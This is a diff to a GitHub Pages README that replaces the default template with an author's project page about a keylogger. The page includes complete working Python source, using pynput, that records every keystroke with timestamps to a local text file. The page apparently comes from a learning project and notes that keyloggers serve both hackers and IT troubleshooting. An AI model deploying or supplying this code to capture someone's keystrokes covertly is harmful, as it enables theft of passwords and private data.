@@ -1,37 +1,31 @@
-## Welcome to GitHub Pages
+##### Author: Allana Gibson 
+##### [LinkedIn](https://www.linkedin.com/in/allana-gibson/)
 
-You can use the [editor on GitHub](https://github.com/Allana-Gibson/Personal-Projects/edit/main/README.md) to maintain and preview the content for your website in Markdown files.
+## KeyLogger Project
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+- A keylogger is a type of monitoring software `or malware` that is used to collect every keystroke the user types.
+#### Reasons for use:
+1. Hackers trying to access **personal data**.
+2. IT organizations attempting to troubleshoot **technical problems**.
 
-### Markdown
-
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+### Here is the source code of my program (in python):
 
 ```markdown
-Syntax highlighted code block
+from pynput.keyboard import Key, Listener
+import logging
 
-# Header 1
-## Header 2
-### Header 3
+logKeystroke = ""
 
-- Bulleted
-- List
+logging.basicConfig(filename=(logKeystroke + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+                                                                   # prints the text with date & time
+def on_press(key):
+    logging.info(str(key)) #when a key is pressed it will store the info in file
 
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
+with Listener(on_press=on_press) as listener:
+    listener.join()
 ```
+- The output will extract a `.txt` file on to the folder displaying every keystroke pressed.
+- The user will have to terminate the program in `Task Manager` to end the application.
 
-For more details see [Basic writing and formatting syntax](https://docs.github.com/en/github/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/Allana-Gibson/Personal-Projects/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and we’ll help you sort it out.
+### Here is a picture of the output file:
+![This is an image](https://myoctocat.com/assets/images/base-octocat.svg)
